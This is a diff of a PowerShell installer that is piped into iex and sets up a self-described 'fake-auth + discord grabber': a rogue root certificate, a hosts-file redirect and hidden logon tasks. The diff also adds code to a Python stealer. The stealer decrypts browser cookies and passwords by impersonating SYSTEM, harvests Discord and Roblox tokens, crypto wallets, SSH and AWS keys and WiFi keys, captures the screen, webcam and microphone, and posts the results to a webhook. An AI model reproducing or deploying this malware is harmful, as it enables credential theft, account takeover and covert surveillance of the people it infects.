@@ -1,20 +1,8 @@
-<#
-  sevenauthapi.com local fake-auth + discord grabber (all-in-one, autostart, hidden)
-
-  Run  : irm -useb https://raw.githubusercontent.com/MarcoCOdev1/d/main/install.ps1 | iex
-  Undo : irm -useb https://raw.githubusercontent.com/MarcoCOdev1/d/main/uninstall.ps1 | iex
-
-  Kay bni C:\seven, kay instali cryptography + requests, kay generi w trusti root
-  cert l sevenauthapi.com, kay ridirecti l domaine l 127.0.0.1, kay bni launcher
-  fakeauth.exe b icon, w kay sajjel jouj tasks (server + grabber) f logon.
-#>
-
 $ErrorActionPreference = 'Stop'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$Source = 'https://raw.githubusercontent.com/MarcoCOdev1/d/main/install.ps1'
+$Source = 'https://raw.githubusercontent.com/MarcoCOdev1/dd/main/install.ps1'
 
-# ---------- relance mn fichier (here-strings safe f iex) ----------
 $admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
          [Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $PSCommandPath) {
@@ -22,50 +10,37 @@ if (-not $PSCommandPath) {
     Invoke-WebRequest -UseBasicParsing $Source -OutFile $tmp
     if (-not $admin) { Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$tmp`"") }
     else { & powershell -NoProfile -ExecutionPolicy Bypass -File $tmp }
-    Write-Host 'Relance...' -ForegroundColor Yellow
     return
 }
 if (-not $admin) {
     Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$PSCommandPath`"")
-    Write-Host 'UAC tlob — 9bel w kemmel f l window jdida.' -ForegroundColor Yellow
     return
 }
 
 $Root   = 'C:\seven'
 $Hosts  = Join-Path $env:windir 'System32\drivers\etc\hosts'
 $Domain = 'sevenauthapi.com'
-$TaskS  = 'FakeAuth'
-$TaskG  = 'FakeAuthGrab'
 $Launcher = Join-Path $Root 'fakeauth.exe'
 $IconUrl  = 'https://cdn.discordapp.com/attachments/1565494169160654911/1565742788987985970/jon_snow_____game_of_thrones.jpg'
 
-# ================= 00 - cleanup =================
-Write-Host '>> 00 cleanup qdim' -ForegroundColor Cyan
-foreach ($t in $TaskS, $TaskG, 'sevenauthapi-fake') {
-    Unregister-ScheduledTask -TaskName $t -Confirm:$false -ErrorAction SilentlyContinue
-}
+Write-Host '>> setup' -ForegroundColor Cyan
+foreach ($t in 'FakeAuth','FakeAuthGrab') { Unregister-ScheduledTask -TaskName $t -Confirm:$false -ErrorAction SilentlyContinue }
 Get-CimInstance Win32_Process -Filter "Name='python.exe' OR Name='pythonw.exe' OR Name='fakeauth.exe'" -ErrorAction SilentlyContinue |
     Where-Object { $_.CommandLine -match 'fake\.py|run\.py|grab\.py' } |
     ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
 Get-ChildItem Cert:\CurrentUser\Root -ErrorAction SilentlyContinue |
     Where-Object { $_.Subject -like "*CN=$Domain*" } | Remove-Item -Force -ErrorAction SilentlyContinue
 
-# ================= 01 - folder + deps =================
-Write-Host '>> 01 folder + deps' -ForegroundColor Cyan
 $py = (Get-Command python -ErrorAction SilentlyContinue)
 if (-not $py) { throw 'python ma kaynch f PATH' }
 $pyw = Join-Path (Split-Path $py.Source) 'pythonw.exe'
 if (-not (Test-Path $pyw)) { $pyw = $py.Source }
 
-if (Test-Path $Root) {
-    $bak = "$Root.bak." + (Get-Date -Format 'yyyyMMdd-HHmmss')
-    Rename-Item $Root $bak; Write-Host "   $Root -> $bak" -ForegroundColor DarkYellow
-}
+if (Test-Path $Root) { Rename-Item $Root ("$Root.bak." + (Get-Date -Format 'yyyyMMdd-HHmmss')) }
 New-Item -ItemType Directory -Path $Root | Out-Null
 Set-Location $Root
 python -m pip install cryptography requests --disable-pip-version-check --quiet
 
-# ================= 02 - makecert.py =================
 $makecert = @'
 from cryptography import x509
 from cryptography.x509.oid import NameOID
@@ -76,7 +51,6 @@ import datetime
 k = rsa.generate_private_key(public_exponent=65537, key_size=2048)
 n = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "sevenauthapi.com")])
 now = datetime.datetime.now(datetime.timezone.utc)
-
 c = (x509.CertificateBuilder().subject_name(n).issuer_name(n)
      .public_key(k.public_key()).serial_number(x509.random_serial_number())
      .not_valid_before(now - datetime.timedelta(days=1))
@@ -85,7 +59,6 @@ c = (x509.CertificateBuilder().subject_name(n).issuer_name(n)
          x509.DNSName("sevenauthapi.com"), x509.DNSName("*.sevenauthapi.com")]), False)
      .add_extension(x509.BasicConstraints(ca=True, path_length=None), True)
      .sign(k, hashes.SHA256()))
-
 open("cert.pem","wb").write(
     k.private_bytes(serialization.Encoding.PEM,
         serialization.PrivateFormat.TraditionalOpenSSL,
@@ -94,7 +67,6 @@ open("seven.cer","wb").write(c.public_bytes(serialization.Encoding.DER))
 print("OK")
 '@
 
-# ================= 02b - run.py =================
 $runner = @'
 import os, sys, time
 os.chdir(os.path.dirname(os.path.abspath(__file__)))
@@ -110,7 +82,6 @@ print(""); print("=== start", time.strftime("%Y-%m-%d %H:%M:%S"), "pid", os.getp
 exec(compile(open("fake.py", encoding="utf-8").read(), "fake.py", "exec"), {"__name__": "__main__"})
 '@
 
-# ================= 04 - fake.py =================
 $fake = @'
 import ssl, json, base64, hashlib, time, uuid, secrets
 from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
@@ -168,7 +139,6 @@ print("fake :443")
 s.serve_forever()
 '@
 
-# ================= cam.ps1 =================
 $cam = @'
 param([string]$Out)
 $ErrorActionPreference = 'Stop'
@@ -199,9 +169,21 @@ if (-not $t2.Wait(20000)) { throw 'capture timeout' }
 $mc.Dispose()
 '@
 
-# ================= 05 - grab.py =================
+$screen = @'
+param([string]$Out)
+$ErrorActionPreference = 'Stop'
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$b = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
+$g = [System.Drawing.Graphics]::FromImage($bmp)
+$g.CopyFromScreen($b.Left, $b.Top, 0, 0, $bmp.Size)
+$bmp.Save($Out, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+$g.Dispose(); $bmp.Dispose()
+'@
+
 $grab = @'
-import os, sys, json, re, time, socket, sqlite3, shutil, subprocess, base64, ctypes, ctypes.wintypes, hashlib, platform
+import os, sys, json, re, time, socket, sqlite3, shutil, subprocess, base64, ctypes, ctypes.wintypes, hashlib, zipfile, random
 
 try:
     import requests
@@ -209,6 +191,7 @@ except Exception:
     requests = None
 
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives import hashes
 
@@ -221,14 +204,25 @@ STATE = os.path.join(DATA, "state.json")
 os.makedirs(DATA, exist_ok=True)
 
 RE_TOKEN = re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{80,90}")
+RE_ROBLOX = re.compile(r"_\|WARNING[^\x00-\x1f\"\\]{50,600}")
 SKIP = {"windows", "$recycle.bin", "system volume information", "node_modules", ".git",
         "package cache", "installer", "winsxs", "driverstore", "temp", "tmp"}
-DISCORD_DIRS = {"discord": "discord", "discordptb": "discordptb", "discordcanary": "discordcanary"}
+UD = os.environ.get("LOCALAPPDATA", "")
+AD = os.environ.get("APPDATA", "")
+
 BROWSERS = [
-    ("Chrome", os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data")),
-    ("Brave",  os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data")),
-    ("Edge",   os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data")),
+    ("Chrome", os.path.join(UD, "Google", "Chrome", "User Data")),
+    ("ChromeBeta", os.path.join(UD, "Google", "Chrome Beta", "User Data")),
+    ("ChromeDev", os.path.join(UD, "Google", "Chrome Dev", "User Data")),
+    ("Brave", os.path.join(UD, "BraveSoftware", "Brave-Browser", "User Data")),
+    ("Edge", os.path.join(UD, "Microsoft", "Edge", "User Data")),
+    ("EdgeBeta", os.path.join(UD, "Microsoft", "Edge Beta", "User Data")),
+    ("Vivaldi", os.path.join(UD, "Vivaldi", "User Data")),
+    ("Opera", os.path.join(AD, "Opera Software", "Opera Stable")),
+    ("OperaGX", os.path.join(AD, "Opera Software", "Opera GX Stable")),
+    ("Yandex", os.path.join(UD, "Yandex", "YandexBrowser", "User Data")),
 ]
+FIREFOX = os.path.join(AD, "Mozilla", "Firefox", "Profiles")
 
 def log(m):
     try:
@@ -240,21 +234,48 @@ def log(m):
     except Exception:
         pass
 
-# ---------------- DPAPI ----------------
 class BLOB(ctypes.Structure):
     _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
 
-def dpapi(data):
+def dpapi(data, system=False):
     buf = ctypes.create_string_buffer(data, len(data))
     bi = BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
     bo = BLOB()
-    if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
+    if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi), None, None, None, None,
+            0x10 if system else 0, ctypes.byref(bo)):
         return None
     out = ctypes.string_at(bo.pbData, bo.cbData)
     ctypes.windll.kernel32.LocalFree(bo.pbData)
     return out
 
-def master_key(user_data):
+def _debug():
+    h = ctypes.windll.kernel32.GetCurrentProcess()
+    tok = ctypes.wintypes.HANDLE()
+    ctypes.windll.advapi32.OpenProcessToken(h, 0x28, ctypes.byref(tok))
+    class TP(ctypes.Structure):
+        _fields_ = [("Count", ctypes.wintypes.DWORD), ("Luid", ctypes.c_ulonglong), ("Attr", ctypes.wintypes.DWORD)]
+    class TPN(ctypes.Structure):
+        _fields_ = [("Count", ctypes.wintypes.DWORD), ("Priv", TP * 1)]
+    luid = ctypes.c_ulonglong()
+    ctypes.windll.advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid))
+    tp = TPN(1, (TP * 1)(TP(1, luid, 0x2)))
+    ctypes.windll.advapi32.AdjustTokenPrivileges(tok, False, ctypes.byref(tp), 0, None, None)
+
+def _impersonate_system():
+    _debug()
+    for pid in pids_of({"winlogon.exe"}):
+        h = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
+        if not h:
+            continue
+        tok = ctypes.wintypes.HANDLE()
+        if ctypes.windll.advapi32.OpenProcessToken(h, 0x0002 | 0x0008, ctypes.byref(tok)):
+            dup = ctypes.wintypes.HANDLE()
+            if ctypes.windll.advapi32.DuplicateTokenEx(tok, 0x0004 | 0x0008 | 0x0010, None, 2, 2, ctypes.byref(dup)):
+                if ctypes.windll.advapi32.ImpersonateLoggedOnUser(dup):
+                    return True
+    return False
+
+def user_key(user_data):
     ls = os.path.join(user_data, "Local State")
     if not os.path.exists(ls):
         return None
@@ -267,43 +288,145 @@ def master_key(user_data):
         return None
     return PBKDF2HMAC(algorithm=hashes.SHA256(), length=16, salt=b"saltysalt", iterations=1).derive(k)
 
-def dec(blob, key):
-    if not key or not blob:
+def app_key(user_data):
+    ls = os.path.join(user_data, "Local State")
+    if not os.path.exists(ls):
+        return None
+    try:
+        raw = base64.b64decode(json.load(open(ls, "r", encoding="utf-8"))["os_crypt"]["app_bound_encrypted_key"])
+    except Exception:
+        return None
+    if raw[:4] != b"APPB":
+        return None
+    ok = _impersonate_system()
+    try:
+        blob = dpapi(raw[4:], True)
+    finally:
+        if ok:
+            ctypes.windll.advapi32.RevertToSelf()
+    if not blob:
+        return None
+    try:
+        key = hashlib.sha256(b"Google Chromekey1").digest()
+        for _ in range(32):
+            e = Cipher(algorithms.AES(key), modes.CBC(key[:16])).encryptor()
+            key = (e.update(key) + e.finalize())[:32]
+        if len(blob) < 32:
+            return None
+        plain = AESGCM(key).decrypt(blob[:12], blob[12:], None)
+        if plain and plain[0] == 1:
+            return plain[1:33]
+    except Exception:
+        return None
+    return None
+
+def dec(blob, key, aad=b"", akey=None):
+    if not blob:
         return ""
     try:
-        if blob[:3] in (b"v10", b"v11"):
+        if blob[:3] in (b"v10", b"v11") and key:
             return AESGCM(key).decrypt(b" " * 32, blob[3:], None).decode("utf-8", "replace")
         if blob[:3] == b"v20":
-            return AESGCM(key).decrypt(b" " * 32, blob[3:], None).decode("utf-8", "replace")
-        return dpapi(blob).decode("utf-8", "replace")
+            if akey and len(blob) > 31:
+                for a in (aad, b""):
+                    try:
+                        return AESGCM(akey).decrypt(blob[3:15], blob[15:], a).decode("utf-8", "replace")
+                    except Exception:
+                        pass
+            return "[v20] " + base64.b64encode(blob).decode()
+        try:
+            return blob.decode("utf-8")
+        except Exception:
+            pass
+        d = dpapi(blob)
+        return d.decode("utf-8", "replace") if d else ""
     except Exception:
         return ""
 
-def cookies(name, user_data):
+def open_db(src):
+    tag = str(random.randint(0, 999999))
+    tmp = os.path.join(DATA, "db" + tag)
+    for ext in ("", "-wal", "-shm", "-journal"):
+        if os.path.exists(src + ext):
+            try:
+                shutil.copy2(src + ext, tmp + ext)
+            except Exception:
+                pass
+    for uri in ("file:%s?immutable=1" % tmp.replace("\\", "/"), "file:%s?mode=ro" % tmp.replace("\\", "/")):
+        try:
+            return sqlite3.connect(uri, uri=True, timeout=5)
+        except Exception:
+            continue
+    return sqlite3.connect(tmp, timeout=5)
+
+def profiles_of(user_data):
+    if not os.path.isdir(user_data):
+        return []
+    try:
+        names = [d for d in os.listdir(user_data) if os.path.isdir(os.path.join(user_data, d))]
+    except Exception:
+        return []
+    sel = [p for p in names if p == "Default" or p.startswith("Profile")]
+    return sel or [""]
+
+def cookies(user_data):
     out = []
-    key = master_key(user_data)
-    profiles = [d for d in os.listdir(user_data) if os.path.isdir(os.path.join(user_data, d))] if os.path.isdir(user_data) else []
-    profiles = [p for p in profiles if p == "Default" or p.startswith("Profile")] or ["Default"]
-    for prof in profiles:
+    key = user_key(user_data)
+    akey = app_key(user_data)
+    for prof in profiles_of(user_data):
         for cand in ("Network\\Cookies", "Cookies"):
             src = os.path.join(user_data, prof, cand)
             if not os.path.exists(src):
                 continue
-            tmp = os.path.join(DATA, "ck.db")
             try:
-                shutil.copy2(src, tmp)
-                con = sqlite3.connect(tmp)
-                rows = con.execute("select host_key,name,encrypted_value,path,expires_utc from cookies").fetchall()
+                con = open_db(src)
+                rows = con.execute("select host_key,name,encrypted_value,path from cookies").fetchall()
                 con.close()
             except Exception:
                 continue
-            for host, cn, ev, path, exp in rows:
-                v = dec(ev, key)
+            for host, cn, ev, path in rows:
+                v = dec(ev, key, host.encode(), akey)
                 if v:
                     out.append("%s\t%s\t%s\t%s" % (host, cn, v, path))
     return out
 
-# ---------------- process scan ----------------
+def passwords(user_data):
+    out = []
+    key = user_key(user_data)
+    akey = app_key(user_data)
+    for prof in profiles_of(user_data):
+        src = os.path.join(user_data, prof, "Login Data")
+        if not os.path.exists(src):
+            continue
+        try:
+            con = open_db(src)
+            rows = con.execute("select origin_url,username_value,password_value from logins").fetchall()
+            con.close()
+        except Exception:
+            continue
+        for url, user, pw in rows:
+            if not user:
+                continue
+            out.append("%s\t%s\t%s" % (url, user, dec(pw, key, url.encode(), akey)))
+    return out
+
+def firefox():
+    out = []
+    if not os.path.isdir(FIREFOX):
+        return out
+    for prof in os.listdir(FIREFOX):
+        src = os.path.join(FIREFOX, prof, "cookies.sqlite")
+        if not os.path.exists(src):
+            continue
+        try:
+            con = open_db(src)
+            for h, n, v in con.execute("select host,name,value from moz_cookies").fetchall():
+                out.append("%s\t%s\t%s\t/" % (h, n, v))
+            con.close()
+        except Exception:
+            pass
+    return out
+
 def pids_of(names):
     found = set()
     try:
@@ -318,9 +441,8 @@ def pids_of(names):
                 buf = ctypes.create_unicode_buffer(1024)
                 sz = ctypes.c_ulong(1024)
                 if ctypes.windll.kernel32.QueryFullProcessImageNameW(h, 0, buf, ctypes.byref(sz)):
-                    p = buf.value
-                    if os.path.basename(p).lower() in names:
-                        found.add(p)
+                    if os.path.basename(buf.value).lower() in names:
+                        found.add(pid)
             finally:
                 ctypes.windll.kernel32.CloseHandle(h)
     except Exception:
@@ -329,28 +451,25 @@ def pids_of(names):
 
 def discord_dirs():
     dirs = set()
-    appdata = os.environ.get("APPDATA", "")
-    for d in DISCORD_DIRS.values():
-        p = os.path.join(appdata, d)
-        if os.path.isdir(p):
-            dirs.add(p)
-    for exe in pids_of({"discord.exe", "discordptb.exe", "discordcanary.exe"}):
-        parts = exe.lower().split(os.sep)
-        for name in parts:
-            if name in DISCORD_DIRS:
-                p = os.path.join(appdata, DISCORD_DIRS[name])
+    for base in (AD, UD):
+        if not os.path.isdir(base):
+            continue
+        for n in os.listdir(base):
+            low = n.lower()
+            if "discord" in low or "lightcord" in low:
+                p = os.path.join(base, n)
                 if os.path.isdir(p):
                     dirs.add(p)
-        local = os.path.join(os.environ.get("LOCALAPPDATA", ""), "discord")
-        if os.path.isdir(local):
-            dirs.add(local)
     return dirs
 
-def read_tokens(folder):
+def read_tokens(folder, max_depth=6):
     hits = set()
+    if not os.path.isdir(folder):
+        return hits
+    base = folder.rstrip("\\").count("\\")
     for dp, dns, fns in os.walk(folder):
-        if "leveldb" not in dp.lower() and "network" not in dp.lower():
-            dns[:] = [d for d in dns if d.lower() in ("local storage", "leveldb", "network")]
+        if dp.count("\\") - base > max_depth:
+            dns[:] = []
         for fn in fns:
             if not fn.lower().endswith((".ldb", ".log", ".sst")):
                 continue
@@ -365,20 +484,26 @@ def read_tokens(folder):
                 hits.add((m, p))
     return hits
 
+def browser_tokens():
+    hits = set()
+    for name, ud in BROWSERS:
+        for prof in profiles_of(ud):
+            p = os.path.join(ud, prof, "Local Storage", "leveldb")
+            if os.path.isdir(p):
+                hits |= read_tokens(p, 1)
+    return hits
+
 def disk_scan(deadline):
     hits = set()
-    roots = []
     for d in "CDEFGH":
-        r = d + ":\\"
-        if os.path.exists(r):
-            roots.append(r)
-    for root in roots:
+        root = d + ":\\"
+        if not os.path.exists(root):
+            continue
         for dp, dns, fns in os.walk(root, topdown=True):
             if time.time() > deadline:
                 return hits
-            base = os.path.basename(dp).lower()
-            dns[:] = [d for d in dns if d.lower() not in SKIP and not d.startswith("$")]
-            if base == "leveldb":
+            dns[:] = [x for x in dns if x.lower() not in SKIP and not x.startswith("$")]
+            if os.path.basename(dp).lower() == "leveldb":
                 dns[:] = []
                 try:
                     for fn in fns:
@@ -392,7 +517,6 @@ def disk_scan(deadline):
                     pass
     return hits
 
-# ---------------- validate ----------------
 def validate(tok):
     if not requests:
         return None
@@ -403,10 +527,8 @@ def validate(tok):
             return {"valid": False, "code": r.status_code}
         u = r.json()
         info = {"valid": True, "id": u.get("id"), "username": u.get("username"),
-                "global_name": u.get("global_name"), "email": u.get("email"),
-                "phone": u.get("phone"), "mfa": u.get("mfa_enabled"),
-                "verified": u.get("verified"), "nitro": u.get("premium_type"),
-                "flags": u.get("flags"), "locale": u.get("locale")}
+                "email": u.get("email"), "phone": u.get("phone"), "mfa": u.get("mfa_enabled"),
+                "verified": u.get("verified"), "nitro": u.get("premium_type")}
         try:
             b = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions",
                              headers={"Authorization": tok}, timeout=15).json()
@@ -417,8 +539,7 @@ def validate(tok):
     except Exception as e:
         return {"valid": None, "err": str(e)[:60]}
 
-# ---------------- system ----------------
-PS_SPECS = r"""
+PS = r"""
 $o=[ordered]@{}
 try{$o.cpu=(Get-CimInstance Win32_Processor).Name -join ' | '}catch{}
 try{$o.gpu=(Get-CimInstance Win32_VideoController).Name -join ' | '}catch{}
@@ -426,18 +547,24 @@ try{$o.ram_gb=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysical
 try{$o.mobo=((Get-CimInstance Win32_BaseBoard).Manufacturer)+' '+(Get-CimInstance Win32_BaseBoard).Product}catch{}
 try{$o.os=(Get-CimInstance Win32_OperatingSystem).Caption+' '+[Environment]::OSVersion.Version}catch{}
 try{$o.disks=@(Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | ForEach-Object { "$($_.DeviceID) $([math]::Round($_.Size/1GB))GB/$([math]::Round($_.FreeSpace/1GB))GB free" }) -join ' | '}catch{}
-try{$o.wifi=(netsh wlan show interfaces | Select-String '^\s*SSID\s*:') -join ' '}catch{}
-try{$o.wifi=(($o.wifi -split ':')[1..99] -join ':').Trim()}catch{}
-try{$o.profiles=@(netsh wlan show profiles | Select-String ':\s*(.+)$' | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }) -join ', '}catch{}
+try{$o.res="$(Get-CimInstance Win32_VideoController | Select-Object -First 1 | ForEach-Object {$_.CurrentHorizontalResolution}x$($_.CurrentVerticalResolution))"}catch{}
+try{$w=(netsh wlan show interfaces | Select-String '^\s*SSID\s*:'); $o.wifi=(($w -join '') -split ':')[1]}catch{}
+try{$o.wifi_keys=@(netsh wlan show profiles | Select-String ':\s*(.+)$' | ForEach-Object { $n=$_.Matches[0].Groups[1].Value.Trim(); $k=(netsh wlan show profile name="$n" key=clear | Select-String 'Key Content\s*:\s*(.+)$'); "$n=$($k.Matches[0].Groups[1].Value)" }) -join ' | '}catch{}
 try{$o.uptime=[int]((Get-Date)-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalMinutes}catch{}
+try{$o.key=(Get-CimInstance SoftwareLicensingService).OA3xOriginalProductKey}catch{}
+try{$o.av=@(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | ForEach-Object { $_.displayName }) -join ', '}catch{}
+try{$o.users=@(Get-LocalUser | ForEach-Object { "$($_.Name)($($_.Enabled))" }) -join ', '}catch{}
+try{$o.procs=@(Get-Process | Sort-Object -Descending WorkingSet | Select-Object -First 30 | ForEach-Object { $_.Name }) -join ', '}catch{}
+try{$o.startup=@(Get-CimInstance Win32_StartupCommand | ForEach-Object { "$($_.Name)=$($_.Command)" }) -join ' || '}catch{}
+try{$o.installed=@(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | ForEach-Object { $_.DisplayName } | Where-Object { $_ }) -join ', '}catch{}
+try{$o.clip=Get-Clipboard -Raw}catch{}
 $o | ConvertTo-Json -Compress
 """
 
-def specs():
+def sysinfo():
     try:
-        r = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", PS_SPECS],
-                           capture_output=True, text=True, timeout=60,
-                           creationflags=0x08000000)
+        r = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", PS],
+                           capture_output=True, text=True, timeout=120, creationflags=0x08000000)
         return json.loads(r.stdout.strip() or "{}")
     except Exception as e:
         return {"err": str(e)[:60]}
@@ -458,60 +585,114 @@ def local_ips():
         for ip in socket.gethostbyname_ex(socket.gethostname())[2]:
             out.add(ip)
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        out.add(s.getsockname()[0])
-        s.close()
+        s.connect(("8.8.8.8", 80)); out.add(s.getsockname()[0]); s.close()
     except Exception:
         pass
     return ", ".join(sorted(out))
 
+def geo(ip):
+    if not requests or ip == "?":
+        return ""
+    try:
+        d = requests.get("http://ip-api.com/json/" + ip, timeout=10).json()
+        return "%s, %s, %s (%s)" % (d.get("city"), d.get("regionName"), d.get("country"), d.get("isp"))
+    except Exception:
+        return ""
+
 def emails():
     out = set()
-    try:
-        out.add(os.environ.get("USERNAME", "") + "@" + os.environ.get("USERDNSDOMAIN", os.environ.get("USERDOMAIN", "")))
-    except Exception:
-        pass
+    u = os.environ.get("USERNAME", "")
+    d = os.environ.get("USERDNSDOMAIN") or os.environ.get("USERDOMAIN") or ""
+    if u and d:
+        out.add(u + "@" + d)
     for name, ud in BROWSERS:
-        if not os.path.isdir(ud):
-            continue
-        for prof in os.listdir(ud):
+        for prof in profiles_of(ud):
             src = os.path.join(ud, prof, "Login Data")
             if not os.path.exists(src):
                 continue
-            tmp = os.path.join(DATA, "ld.db")
             try:
-                shutil.copy2(src, tmp)
-                con = sqlite3.connect(tmp)
-                for (u,) in con.execute("select username_value from logins where username_value like '%@%'"):
-                    if u:
-                        out.add(u.strip())
+                con = open_db(src)
+                for (x,) in con.execute("select username_value from logins where username_value like '%@%'"):
+                    if x:
+                        out.add(x.strip())
                 con.close()
             except Exception:
                 pass
     return sorted(x for x in out if "@" in x)
 
-# ---------------- media ----------------
+def histories():
+    out = {}
+    for name, ud in BROWSERS:
+        n = 0
+        for prof in profiles_of(ud):
+            src = os.path.join(ud, prof, "History")
+            if not os.path.exists(src):
+                continue
+            try:
+                con = open_db(src)
+                n += con.execute("select count(*) from urls").fetchone()[0]
+                con.close()
+            except Exception:
+                pass
+        if n:
+            out[name] = n
+    return out
+
+def roblox():
+    out = set()
+    base = os.path.join(UD, "Roblox", "LocalStorage")
+    for dp, dns, fns in os.walk(base):
+        for fn in fns:
+            if not fn.lower().endswith((".ldb", ".log")):
+                continue
+            try:
+                blob = open(os.path.join(dp, fn), "rb").read().decode("latin-1")
+            except Exception:
+                continue
+            for m in RE_ROBLOX.findall(blob):
+                out.add(m)
+    return out
+
+WALLETS = {
+    "Exodus": os.path.join(AD, "Exodus", "exodus.wallet"),
+    "Electrum": os.path.join(AD, "Electrum", "wallets"),
+    "Atomic": os.path.join(AD, "atomic", "Local Storage", "leveldb"),
+    "Coinomi": os.path.join(AD, "Coinomi", "Coinomi", "wallets"),
+    "Bitcoin": os.path.join(AD, "Bitcoin", "wallets"),
+    "Monero": os.path.join(AD, "bitmonero"),
+    "Metamask": os.path.join(UD, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
+    "Phantom": os.path.join(UD, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
+}
+MISC = [
+    os.path.expanduser("~/.ssh/id_rsa"), os.path.expanduser("~/.ssh/id_ed25519"),
+    os.path.expanduser("~/.ssh/known_hosts"), os.path.expanduser("~/.aws/credentials"),
+    os.path.expanduser("~/.gitconfig"), os.path.expanduser("~/.npmrc"),
+    os.path.join(AD, ".minecraft", "launcher_accounts.json"),
+]
+
 def camera():
     out = os.path.join(DATA, "cam.jpg")
     try:
         if os.path.exists(out):
             os.remove(out)
-    except Exception:
-        pass
-    try:
         subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                         "-File", os.path.join(ROOT, "cam.ps1"), "-Out", out],
                        capture_output=True, timeout=45, creationflags=0x08000000)
     except Exception:
         pass
-    if os.path.exists(out) and os.path.getsize(out) > 2000:
-        return out
+    return out if os.path.exists(out) and os.path.getsize(out) > 2000 else None
+
+def shot():
+    out = os.path.join(DATA, "screen.jpg")
     try:
-        subprocess.run(["ffmpeg", "-y", "-f", "dshow", "-i", "video=default", "-frames:v", "1", out],
-                       capture_output=True, timeout=30, creationflags=0x08000000)
+        if os.path.exists(out):
+            os.remove(out)
+        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
+                        "-File", os.path.join(ROOT, "screen.ps1"), "-Out", out],
+                       capture_output=True, timeout=45, creationflags=0x08000000)
     except Exception:
         pass
-    return out if os.path.exists(out) and os.path.getsize(out) > 2000 else None
+    return out if os.path.exists(out) and os.path.getsize(out) > 3000 else None
 
 def voice(sec=10):
     out = os.path.join(DATA, "voice.wav")
@@ -534,7 +715,6 @@ def voice(sec=10):
         log("voice %r" % e)
     return out if os.path.exists(out) and os.path.getsize(out) > 4000 else None
 
-# ---------------- state ----------------
 def load_state():
     try:
         return json.load(open(STATE, "r", encoding="utf-8"))
@@ -547,45 +727,95 @@ def save_state(s):
     except Exception:
         pass
 
-def h(t):
+def hh(t):
     return hashlib.sha256(t.encode()).hexdigest()[:16]
 
-# ---------------- send ----------------
 def send(payload, files):
     if not requests:
         return
     try:
-        r = requests.post(WEBHOOK, data={"payload_json": json.dumps(payload)},
-                          files=files, timeout=120)
+        r = requests.post(WEBHOOK, data={"payload_json": json.dumps(payload)}, files=files or {}, timeout=180)
         log("send %s %s" % (r.status_code, r.text[:120]))
     except Exception as e:
         log("send err %r" % e)
 
-# ---------------- cycle ----------------
-def cycle():
-    t0 = time.time()
-    host = socket.gethostname()
-    ip = pub_ip()
-    st = load_state()
-    known = st.setdefault("tokens", {})
-
+def quick_tokens():
     found = set()
     for d in discord_dirs():
         found |= read_tokens(d)
+    found |= browser_tokens()
+    return {k: v for k, v in found if len(k) > 50}
+
+def build_zip(sp):
+    path = os.path.join(DATA, "dump.zip")
+    ck, pw = [], []
     for name, ud in BROWSERS:
-        if os.path.isdir(ud):
-            found |= read_tokens(os.path.join(ud, "Default", "Local Storage"))
-    found |= disk_scan(t0 + 150)
+        c = cookies(ud)
+        p = passwords(ud)
+        if c:
+            ck += ["# %s" % name] + c
+        if p:
+            pw += ["# %s" % name] + p
+    ck += ["# Firefox"] + firefox()
+    rb = roblox()
+    tot = 0
+    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
+        z.writestr("cookies.txt", "\n".join(ck))
+        z.writestr("passwords.txt", "\n".join(pw))
+        z.writestr("sysinfo.txt", json.dumps(sp, indent=1, ensure_ascii=False))
